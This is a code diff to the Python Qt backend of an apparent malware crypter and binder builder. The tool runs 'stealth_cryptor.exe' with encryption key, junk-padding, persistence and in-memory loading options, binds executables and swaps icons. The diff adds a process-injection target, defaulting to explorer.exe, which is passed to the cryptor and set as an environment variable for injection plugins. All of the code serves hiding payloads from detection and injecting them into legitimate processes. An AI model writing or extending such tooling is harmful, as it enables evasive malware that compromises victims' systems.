@@ -132,7 +132,7 @@ class Backend(QtCore.QObject):
         self._rcedit_primary = self._bin / 'rcedit-x64.exe'
         self._rcedit_fallback = self._root / 'rcedit-x64.exe'
 
-    def build_command(self, payload_path, output_path, key_text, junk_mb, load_in_memory, log_fn=None, warn_fn=None):
+    def build_command(self, payload_path, output_path, key_text, junk_mb, load_in_memory, inject_target='explorer.exe', log_fn=None, warn_fn=None):
         payload = Path(payload_path or '')
         output = Path(output_path or '')
         if not payload.exists() or not payload.is_file():
@@ -152,7 +152,8 @@ class Backend(QtCore.QObject):
         cryptor = self._bin / 'stealth_cryptor.exe'
         if not cryptor.exists() and warn_fn:
             warn_fn(f'`{cryptor}` not found; build it first (bin/).')
-        cmd = [str(cryptor), str(payload), str(output), key, junk_mb, persistence, load_in_mem_flag]
+        # Pass inject_target as 7th arg
+        cmd = [str(cryptor), str(payload), str(output), key, junk_mb, persistence, load_in_mem_flag, inject_target or 'explorer.exe']
         return cmd, key, generated
 
     def build_binder_command(self, exe1, exe2, output_path, name1=None, name2=None, icon_path=None, warn_fn=None):
@@ -233,7 +234,7 @@ class Backend(QtCore.QObject):
         except Exception:
             pass
 
-    def start_process(self, cmd, plugin_dir=None, disable_plugins_default=False, workdir=None, icon_stub_override=None):
+    def start_process(self, cmd, plugin_dir=None, disable_plugins_default=False, workdir=None, icon_stub_override=None, inject_target=None):
         env = os.environ.copy()
         if plugin_dir:
             env['PLUGIN_DIR'] = plugin_dir
@@ -241,6 +242,9 @@ class Backend(QtCore.QObject):
             env.pop('PLUGIN_DIR', None)  # ensure stale value is cleared
             if disable_plugins_default:
                 env['PLUGIN_DIR_DISABLE'] = "1"
+        # Set injection target for remote process injection plugins
+        if inject_target:
+            env['STEALTH_INJECT_TARGET'] = inject_target
         stub_swap = None
         if icon_stub_override:
             try:
